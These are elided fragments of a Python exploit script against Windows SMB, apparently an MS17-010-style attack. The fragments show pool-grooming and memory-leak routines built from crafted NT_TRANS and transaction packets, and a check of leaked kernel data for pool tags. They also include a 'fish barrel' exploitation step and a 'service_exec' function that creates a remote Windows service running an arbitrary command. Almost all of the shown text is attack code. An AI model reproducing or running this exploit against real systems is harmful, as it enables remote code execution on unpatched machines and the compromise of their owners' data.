...
def leak_frag_size(conn, tid, fid):
	...
	mid = conn.next_mid()
	req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data=b'A'*0x10d0, maxParameterCount=GROOM_TRANS_SIZE-0x10d0-TRANS_NAME_LEN)
	req2 = conn.create_nt_trans_secondary_packet(mid, data=b'B'*276) # leak more 276 bytes
...
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
	...
	req1 = conn.create_nt_trans_packet(5, param=trans_param, mid=mid_ntrename, data=b'A'*0x10d0, maxParameterCount=info['GROOM_DATA_SIZE']-0x10d0)
	req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data=b'B'*276) # leak more 276 bytes
	...
	for i in range(12):
		mid = next_extra_mid()
		reqs.append(conn.create_trans_packet(b'', mid=mid, param=trans_param, totalDataCount=info['BRIDE_DATA_SIZE']-0x200, totalParameterCount=0x200, maxDataCount=0, maxParameterCount=0))
	...
	if leakData[0x4:0x8] != b'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN']+2] != expected_size or leakData[leakTransOffset+2:leakTransOffset+4] != expected_size:
...
def exploit_fish_barrel(conn, pipe_name, info):
	...
	# ================================
	shift_indata_byte = 0x200
	conn.do_write_andx_raw_pipe(info['fid'], b'A'*shift_indata_byte)
...
def service_exec(conn, cmd):
	...
	try:
		...
		try:
			resp = scmr.hROpenServiceW(rpcsvc, svcHandle, service_name+b'\x00')
		...
		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + b'\x00', service_name + b'\x00', lpBinaryPathName=cmd + b'\x00')
